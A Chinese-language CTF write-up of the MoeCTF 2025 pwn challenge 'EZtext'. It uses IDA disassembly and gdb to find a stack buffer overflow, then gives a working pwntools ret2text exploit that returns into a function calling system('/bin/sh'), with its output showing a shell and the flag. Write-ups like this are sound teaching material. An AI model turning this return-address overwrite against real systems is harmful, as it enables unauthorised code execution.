---
title: '西电CTF MoeCTF 2025 PWN 2_EZtext'
date: '2026-09-03T12:34:44+08:00'
lastmod: '2026-09-03T12:34:44+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "PWN"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=919)

> 根据题目提示，本题是ret2text(`Return-to-text`)

依旧是IDA大法。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts("Stack overflow is a powerful art!");
  puts("In this MoeCTF,I will show you the charm of PWN!");
  puts("You need to understand the structure of the stack first.");
  puts("Then how many bytes do you need to overflow the stack?");
  __isoc99_scanf("%d", &v4);
  overflow(v4);
  return 0;
}
```

```c
int __fastcall overflow(int a1)
{
  char buf[8]; // [rsp+18h] [rbp-8h] BYREF

  if ( a1 <= 7 )
    return puts("Come on, you can't even fill up this array?");
  read(0, buf, a1);
  return puts("OK,I receive your byte.and then?");
}
```

注意到。

```c	
int treasure()
{
  puts("Congratulations! You got the secret!");
  return system("/bin/sh");
}
```

显然是使用overflow的ret跳转到treasure中获取到shell。



查找目标地址。
```assembly
.text:00000000004011B6 ; int treasure()
.text:00000000004011B6                 public treasure
.text:00000000004011B6 treasure        proc near
.text:00000000004011B6 ; __unwind {
.text:00000000004011B6                 endbr64
.text:00000000004011BA                 push    rbp
.text:00000000004011BB                 mov     rbp, rsp
.text:00000000004011BE                 lea     rax, s          ; "Congratulations! You got the secret!"
.text:00000000004011C5                 mov     rdi, rax        ; s
.text:00000000004011C8                 call    _puts
.text:00000000004011CD                 lea     rax, command    ; "/bin/sh"
.text:00000000004011D4                 mov     rdi, rax        ; command
.text:00000000004011D7                 call    _system
.text:00000000004011DC                 nop
.text:00000000004011DD                 pop     rbp
.text:00000000004011DE                 retn
.text:00000000004011DE ; } // starts at 4011B6
.text:00000000004011DE treasure        endp
```

这里使用0x00000000004011CD作为目标地址。



```assembly
.text:0000000000401205 loc_401205:                             ; CODE XREF: overflow+13↑j
.text:0000000000401205                 mov     eax, [rbp+var_14]
.text:0000000000401208                 movsxd  rdx, eax        ; nbytes
.text:000000000040120B                 lea     rax, [rbp+buf]
.text:000000000040120F                 mov     rsi, rax        ; buf
.text:0000000000401212                 mov     edi, 0          ; fd
.text:0000000000401217                 call    _read
.text:000000000040121C                 lea     rax, large cs:402068h ; "OK,I receive your byte.and then?"
.text:0000000000401223                 mov     rdi, rax        ; s
.text:0000000000401226                 call    _puts
.text:000000000040122B                 nop
```



> 为什么IDA知道参数对应的寄存器？
>
> 一般情况下函数调用遵循x86-64调用约定。
>
> |     实际参数类型     |           寄存器           |
> | :------------------: | :------------------------: |
> | 整数/指针实际参数1–6 | RDI, RSI, RDX, RCX, R8, R9 |
> |   浮点实际参数1–8    |        XMM0 – XMM7         |
> |     余下实际参数     |            堆栈            |
> |     静态链接指针     |            R10             |
>
> 并且IDA知晓read的函数原型read(int fd, void *buf, size_t count)。
> 所以根据寄存器顺序来标注。[^1]





这里需要找buf的地址，在0x0000000000401212打断点。

```
(gdb) b *0x401226
Breakpoint 1 at 0x401226
(gdb) r
Starting program: /path/to/pwn
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Stack overflow is a powerful art!
In this MoeCTF,I will show you the charm of PWN!
You need to understand the structure of the stack first.
Then how many bytes do you need to overflow the stack?
20 // 这里可以暂时输入任意大于7的

Breakpoint 1, 0x0000000000401226 in overflow ()
(gdb) info registers
...
rsi            0x7fffffffd7f8      140737488345080
rdi            0x402068            4202600
rbp            0x7fffffffd800      0x7fffffffd800
rsp            0x7fffffffd7e0      0x7fffffffd7e0
...
(gdb) q
```

buf的起始地址为(%rsi) = 0x7fffffffd7f8。

rbp为0x7fffffffd800。

所以 rbp距离buf 0x800 - 0x7f8 = 0x8字节 rbp距离保存的返回地址也是8字节。

所以需要填充8+8=16字节。



pwntools代码:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 44210)

target = 0x4011CD

io.sendline(b'24')

io.sendline(b'A' * (8 + 8) + p64(target))

io.interactive()
```

运行结果:

```
[x] Opening connection to 127.0.0.1 on port 44210
[x] Opening connection to 127.0.0.1 on port 44210: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 44210: Done
[DEBUG] Sent 0x3 bytes:
    b'24\n'
[DEBUG] Sent 0x19 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  cd 11 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000019
[*] Switching to interactive mode
[DEBUG] Received 0xc3 bytes:
    b'Stack overflow is a powerful art!\n'
    b'In this MoeCTF,I will show you the charm of PWN!\n'
    b'You need to understand the structure of the stack first.\n'
    b'Then how many bytes do you need to overflow the stack?\n'
Stack overflow is a powerful art!
In this MoeCTF,I will show you the charm of PWN!
You need to understand the structure of the stack first.
Then how many bytes do you need to overflow the stack?
[DEBUG] Received 0x20 bytes:
    b'OK,I receive your byte.and then?'
OK,I receive your byte.and then?[DEBUG] Received 0x1 bytes:
    b'\n'

ls

[DEBUG] Sent ...

bin
flag
lib
lib32
lib64
libexec
libx32
pwn

cat flag

[DEBUG] Sent ...

moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 44210
```



[^1]:[x86-64调用约定](https://zh.wikipedia.org/wiki/X86%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A#x86-64%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A)
[^CTF Wiki]:[ret2text](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text)
